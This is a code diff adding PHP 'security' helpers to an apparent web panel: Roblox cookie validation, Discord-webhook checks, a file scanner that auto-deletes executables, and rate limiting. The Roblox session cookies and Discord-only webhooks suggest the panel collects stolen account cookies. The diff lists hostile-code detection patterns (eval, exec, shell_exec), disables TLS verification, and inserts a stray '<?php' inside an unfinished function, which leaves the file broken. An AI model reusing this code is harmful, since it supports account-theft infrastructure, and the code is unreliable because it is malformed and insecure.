@@ -395,5 +395,252 @@ function getCountryFromIP($ip = null) {
     }
     
     return 'Unknown';
+
+<?php
+// ... your existing functions ...
+
+// ============================================
+// SECURITY FUNCTIONS - ADD BELOW
+// ============================================
+
+/**
+ * Validate cookie input for security
+ */
+function validateCookie($cookie) {
+    // Remove any PHP tags
+    $cookie = str_replace(['<?', '?>', '<?php', '<?='], '', $cookie);
+    
+    // Check length (Roblox cookies are typically 500-1000 chars)
+    if (strlen($cookie) < 100 || strlen($cookie) > 2000) {
+        return false;
+    }
+    
+    // Check for suspicious patterns
+    $suspiciousPatterns = [
+        '/eval\s*\(/i',
+        '/exec\s*\(/i',
+        '/system\s*\(/i',
+        '/passthru/i',
+        '/shell_exec/i',
+        '/base64_decode\s*\(/i',
+        '/<\?php/i',
+        '/\$_GET/i',
+        '/\$_POST/i',
+        '/\$_REQUEST/i',
+        '/file_get_contents.*php:\/\//i',
+        '/curl_exec.*eval/i',
+        '/monarx/i',
+        '/unlink\s*\(/i'
+    ];
+    
+    foreach ($suspiciousPatterns as $pattern) {
+        if (preg_match($pattern, $cookie)) {
+            return false;
+        }
+    }
+    
+    return true;
+}
+
+/**
+ * Enhanced directory sanitization (prevent path traversal)
+ */
+function sanitizeDirectory($directory) {
+    // Remove path traversal attempts
+    $directory = str_replace(['../', '..\\', './', '.\\', '..'], '', $directory);
+    
+    // Remove null bytes
+    $directory = str_replace("\0", '', $directory);
+    
+    // Only allow alphanumeric, underscore, and hyphen
+    $directory = preg_replace('/[^a-zA-Z0-9_-]/', '', trim($directory));
+    
+    // Convert to lowercase for consistency
+    $directory = strtolower($directory);
+    
+    return $directory;
+}
+
+/**
+ * Enhanced webhook validation
+ */
+function validateWebhook($webhook) {
+    // Must be a valid URL
+    if (!filter_var($webhook, FILTER_VALIDATE_URL)) {
+        return false;
+    }
+    
+    // Must be HTTPS
+    if (!preg_match('/^https:\/\//i', $webhook)) {
+        return false;
+    }
+    
+    // Must be Discord webhook
+    if (!preg_match('/^https:\/\/discord(app)?\.com\/api\/webhooks\//i', $webhook)) {
+        return false;
+    }
+    
+    // Test the webhook
+    $ch = curl_init($webhook);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_NOBODY, true);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    
+    $result = curl_exec($ch);
+    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    curl_close($ch);
+    
+    // Discord webhooks return 200 or 405 for HEAD requests
+    return in_array($httpCode, [200, 405]);
+}
+
+/**
+ * Security scan for malicious files
+ */
+function securityScan($autoDelete = true) {
+    $suspicious = [];
+    $dataDir = DATA_PATH;
+    
+    if (!is_dir($dataDir)) {
+        return $suspicious;
+    }
+    
+    try {
+        $files = new RecursiveIteratorIterator(
+            new RecursiveDirectoryIterator($dataDir, RecursiveDirectoryIterator::SKIP_DOTS),
+            RecursiveIteratorIterator::CATCH_GET_CHILD
+        );
+        
+        $dangerousExtensions = ['php', 'php3', 'php4', 'php5', 'phtml', 'phar', 'exe', 'sh', 'bat', 'cmd'];
+        
+        foreach ($files as $file) {
+            if ($file->isFile()) {
+                $ext = strtolower($file->getExtension());
+                
+                // Check for dangerous file extensions
+                if (in_array($ext, $dangerousExtensions)) {
+                    $suspicious[] = [
+                        'path' => $file->getRealPath(),
+                        'reason' => 'Dangerous file extension: ' . $ext
+                    ];
+                    
+                    // Auto-delete if enabled
+                    if ($autoDelete) {
+                        @unlink($file->getRealPath());
+                    }
+                }
+                
+                // Check JSON files for suspicious content
+                if ($ext === 'json') {
+                    $content = file_get_contents($file->getRealPath());
+                    if (preg_match('/eval\s*\(|base64_decode|exec\s*\(/i', $content)) {
+                        $suspicious[] = [
+                            'path' => $file->getRealPath(),
+                            'reason' => 'Suspicious content in JSON file'
+                        ];
+                        
+                        if ($autoDelete) {
+                            @unlink($file->getRealPath());
+                        }
+                    }
+                }
+            }
+        }
+    } catch (Exception $e) {
+        // Silent fail
+    }
+    
+    return $suspicious;
+}
+
+/**
+ * Log security events
+ */
+function logSecurityEvent($event, $details = []) {
+    $logDir = dirname(DATA_PATH);
+    $logFile = $logDir . '/security.log';
+    
+    $entry = [
+        'timestamp' => date('Y-m-d H:i:s'),
+        'event' => $event,
+        'ip' => getUserIP(),
+        'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown',
+        'details' => $details
+    ];
+    
+    @file_put_contents(
+        $logFile, 
+        json_encode($entry, JSON_UNESCAPED_SLASHES) . PHP_EOL, 
+        FILE_APPEND | LOCK_EX
+    );
+}
+
+/**
+ * Rate limiting
+ */
+function checkRateLimit($identifier = null, $maxRequests = 50, $timeWindow = 3600) {
+    if ($identifier === null) {
+        $identifier = getUserIP();
+    }
+    
+    $rateLimitFile = dirname(DATA_PATH) . '/rate_limit_' . md5($identifier) . '.txt';
+    
+    // Clean up old rate limit files (older than timeWindow)
+    if (file_exists($rateLimitFile)) {
+        $fileTime = filemtime($rateLimitFile);
+        if (time() - $fileTime > $timeWindow) {
+            @unlink($rateLimitFile);
+            return true;
+        }
+    }
+    
+    // Get current count
+    $requestCount = file_exists($rateLimitFile) ? (int)file_get_contents($rateLimitFile) : 0;
+    
+    // Check if exceeded
+    if ($requestCount >= $maxRequests) {
+        logSecurityEvent('rate_limit_exceeded', [
+            'identifier' => $identifier,
+            'count' => $requestCount
+        ]);
+        return false;
+    }
+    
+    // Increment count
+    file_put_contents($rateLimitFile, $requestCount + 1);
+    
+    return true;
+}
+
+/**
+ * Clean up old rate limit files
+ */
+function cleanupRateLimits() {
+    $dir = dirname(DATA_PATH);
+    $files = glob($dir . '/rate_limit_*.txt');
+    
+    foreach ($files as $file) {
+        if (time() - filemtime($file) > 3600) {
+            @unlink($file);
+        }
+    }
+}
+function sanitizeInput($input, $type = 'string') {
+    switch ($type) {
+        case 'email':
+            return filter_var($input, FILTER_SANITIZE_EMAIL);
+        
+        case 'url':
+            return filter_var($input, FILTER_SANITIZE_URL);
+        
+        case 'int':
+            return filter_var($input, FILTER_SANITIZE_NUMBER_INT);
+        
+        case 'string':
+        default:
+            return htmlspecialchars(trim($input), ENT_QUOTES, 'UTF-8');
+    }
 }
 ?>
+
